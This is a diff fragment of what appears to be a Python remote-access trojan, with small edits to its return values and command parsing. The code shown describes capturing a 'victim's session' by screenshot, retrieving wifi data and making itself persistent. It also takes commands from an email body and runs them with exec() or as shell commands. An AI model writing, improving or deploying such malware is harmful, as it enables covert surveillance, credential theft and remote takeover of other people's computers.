@@ -109,13 +109,13 @@ def get_wifi_data():
         logprint(error_text)
     else:
         logprint("INFO: Successfully retrieved wifi data.\n")
-        return file_path
+        return [file_path]
 
 
 def take_screenshot():
     '''Takes a screenshot of the victim's session and return its file path'''
     screenshot = pyscreeze.screenshot('ico.png')
-    return getcwd(screenshot)
+    return [getcwd(screenshot)]
 
 
 def make_persistent():
@@ -147,10 +147,10 @@ def run_command_order(email_body):
         '"', '').replace("=3D", "=").split(",")
 
     logprint(f"INFO: Command order is as follows, parsing:{command_order}")
-    if command_order[0] == "local":
+    if command_order[0] == "script":
         logprint("INFO: Detected local command, running accordingly")
         results = str(exec(f"{command_order[1]}"))
-    if command_order[0] == "os":
+    elif command_order[0] == "os":
         logprint("INFO: Detected global command, running accordingly")
         results = check_output(command_order[1].split()).decode(
             'utf-8', errors="backslashreplace")
